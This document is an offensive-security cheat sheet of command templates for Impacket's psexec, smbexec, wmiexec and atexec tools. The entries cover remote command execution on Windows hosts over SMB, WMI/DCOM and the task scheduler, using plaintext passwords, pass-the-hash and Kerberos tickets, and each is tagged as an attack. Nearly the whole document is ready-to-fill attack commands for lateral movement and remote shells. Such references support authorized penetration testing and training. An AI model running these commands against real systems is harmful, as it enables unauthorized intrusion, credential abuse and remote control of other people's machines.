# impacket

% impacket, windows, exec

## PSEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py <domain>/<user>:<password>@<rhost>
```

## PSEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
psexec.py -hashes <hash> <user>@<rhost>
```

## PSEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service (using \pipe\svcctl via SMB)

```
export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <rhost> -target-ip <rhost> -no-pass -k <domain>/<user>@<target_name>
```

## SMBEXEC with username
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py <domain>/<user>:<password>@<rhost>
```

## SMBEXEC with pass the Hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
smbexec.py -hashes <hash> <user>@<rhost>
```

## SMBEXEC with kerberos
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
create a new service 'BTOBTO' (using temp bat files via SMB)
```
export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <rhost> -target-ip <rhost> -no-pass -k <domain>/<user>@<target_name>
```

## wmiexec
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  
Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py <domain>/<user>:<password>@<rhost>
```

## wmiexec  with pass the hash (pth) 
#plateform/linux #target/remote #port/135 #protocol/wmi #cat/ATTACK/CONNECT  

Execute a command shell without touching the disk or running a new service using DCOM

```
wmiexec.py -hashes <hash> <user>@<rhost>
```

## atexec - execute command view the task scheduler 
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Using \pipe\atsvc via SMB

```
atexec.py <domain>/<user>:<password>@<rhost> "command"
```

## atexec pass the hash (pth)
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
Execute command view the task scheduler (using \pipe\atsvc via SMB)

```
atexec.py -hashes <hash> <user>@<rhost> "command"
```
